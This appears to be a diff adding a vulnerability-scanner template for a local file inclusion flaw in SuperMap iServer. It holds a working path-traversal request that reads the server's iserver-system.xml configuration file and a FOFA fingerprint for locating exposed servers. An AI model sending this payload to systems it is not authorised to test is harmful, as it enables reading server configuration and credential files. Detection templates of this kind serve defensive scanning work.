@@ -1,0 +1,32 @@
+id: iserver-lfi
+info:
+  name: SuperMap iServer - Local File Inclusion
+  author: qwtd
+  severity: high
+  description: |
+    The SuperMap iServer has a local file inclusion vulnerability that allows attackers to read arbitrary files on the server.
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Supermap%20iServer/Supermap%20iServer%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="-1656662001"
+  tags: SuperMap-iServer
+  classification:
+    cwe-id: CWE-522
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/iserver/output/../WEB-IN%2546/iserver-system.xml'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <?xml
+          - realspaceSecurityEnabled
+          - checkDatasourceConnectionInterval
+        condition: and
+      - type: status
+        status:
+          - 200
